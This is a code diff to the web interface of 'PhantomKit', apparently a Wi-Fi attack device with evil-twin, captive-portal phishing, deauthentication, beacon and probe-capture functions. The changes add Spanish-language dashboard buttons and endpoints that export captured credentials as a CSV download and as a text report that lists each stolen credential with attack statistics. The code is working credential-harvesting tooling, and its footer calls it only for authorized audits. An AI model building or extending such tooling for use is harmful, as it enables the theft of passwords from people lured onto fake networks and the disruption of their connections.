@@ -101,6 +101,8 @@ void PhantomWebServer::begin() {
     server.on("/api/probe", HTTP_POST, [this]() { handleAPIProbe(); });
     server.on("/api/eviltwin", HTTP_POST, [this]() { handleAPIEvilTwin(); });
     server.on("/api/autoportal", HTTP_POST, [this]() { handleAPIAutoPortal(); });
+    server.on("/api/export/csv", HTTP_GET, [this]() { handleAPIExportCSV(); });
+    server.on("/api/export/report", HTTP_GET, [this]() { handleAPIExportReport(); });
     server.onNotFound([this]() {
         if (portal.isActive()) {
             String fn = String("/templates/") + TEMPLATES[portal.getCurrentTemplate()];
@@ -157,7 +159,11 @@ void PhantomWebServer::handleDashboard() {
     html += "<div class='stat'><span class='sv' id='sT'>-</span><span class='sl'>Template</span></div>";
     html += "</div></div>";
     
-    html += "<div class='card f'><h2>Credenciales</h2><div id='ct'><p class='e'>Sin credenciales</p></div></div>";
+    html += "<div class='card f'><h2>Credenciales</h2><div id='ct'><p class='e'>Sin credenciales</p></div>";
+    html += "<div class='bg' style='margin-top:12px'>";
+    html += "<a href='/api/export/csv' class='bp' style='padding:8px 16px;border:none;border-radius:4px;font-family:inherit;font-size:12px;font-weight:600;cursor:pointer;text-transform:uppercase;background:#1a1a2e;color:#e0e0e0;text-decoration:none'>Exportar CSV</a>";
+    html += "<a href='/api/export/report' class='bp' style='padding:8px 16px;border:none;border-radius:4px;font-family:inherit;font-size:12px;font-weight:600;cursor:pointer;text-transform:uppercase;background:#1a1a2e;color:#e0e0e0;text-decoration:none'>Exportar Reporte</a>";
+    html += "</div></div>";
     html += "</div></div>";
     
     html += "<div id='tab-deauth' style='display:none'><div class='g'>";
@@ -301,4 +307,86 @@ void PhantomWebServer::handleAPIAutoPortal() {
     if (a == "start") { autoPortal.startAutoScan(); server.send(200, "text/plain", "OK"); }
     else if (a == "stop") { autoPortal.stopAutoScan(); server.send(200, "text/plain", "OK"); }
     else { server.send(400, "text/plain", "Error"); }
+}
+
+void PhantomWebServer::handleAPIExportCSV() {
+    if (!LittleFS.exists("/credentials.csv")) {
+        server.send(404, "text/plain", "Sin credenciales");
+        return;
+    }
+    File f = LittleFS.open("/credentials.csv", "r");
+    if (!f) {
+        server.send(500, "text/plain", "Error al abrir archivo");
+        return;
+    }
+    server.sendHeader("Content-Disposition", "attachment; filename=\"credentials.csv\"");
+    server.sendHeader("Content-Type", "text/csv");
+    server.sendHeader("Content-Length", String(f.size()));
+    server.streamFile(f, "text/csv");
+    f.close();
+}
+
+void PhantomWebServer::handleAPIExportReport() {
+    unsigned long uptime = millis() / 1000;
+    unsigned long hrs  = uptime / 3600;
+    unsigned long mins = (uptime % 3600) / 60;
+    unsigned long secs = uptime % 60;
+
+    String report;
+    report.reserve(2048);
+    report += "========================================\n";
+    report += "  PhantomKit - Reporte de Sesion\n";
+    report += "========================================\n\n";
+
+    char uptimeBuf[32];
+    snprintf(uptimeBuf, sizeof(uptimeBuf), "%02lu:%02lu:%02lu", hrs, mins, secs);
+    report += "Duracion de sesion : ";
+    report += uptimeBuf;
+    report += "\n";
+    report += "Credenciales       : ";
+    report += String(store.getCount());
+    report += "\n";
+    report += "Template activo    : ";
+    report += String(TEMPLATE_NAMES[portal.getCurrentTemplate()]);
+    report += "\n";
+    report += "Deauth frames      : ";
+    report += String(deauth.getFramesSent());
+    report += "\n";
+    report += "Beacons enviados   : ";
+    report += String(beacon.getBeaconsSent());
+    report += "\n";
+    report += "Probes capturados  : ";
+    report += String(probe.getProbesCaptured());
+    report += "\n\n";
+    report += "----------------------------------------\n";
+    report += "  Credenciales capturadas\n";
+    report += "----------------------------------------\n";
+
+    if (LittleFS.exists("/credentials.csv")) {
+        File f = LittleFS.open("/credentials.csv", "r");
+        if (f) {
+            int n = 1;
+            while (f.available()) {
+                String line = f.readStringUntil('\n');
+                line.trim();
+                if (line.length() == 0) continue;
+                report += "[";
+                report += String(n++);
+                report += "] ";
+                report += line;
+                report += "\n";
+            }
+            f.close();
+        }
+    } else {
+        report += "Sin credenciales en esta sesion.\n";
+    }
+
+    report += "\n========================================\n";
+    report += "  Generado por PhantomKit v1.1.0\n";
+    report += "  Solo para auditorias autorizadas\n";
+    report += "========================================\n";
+
+    server.sendHeader("Content-Disposition", "attachment; filename=\"phantomkit_report.txt\"");
+    server.send(200, "text/plain", report);
 }
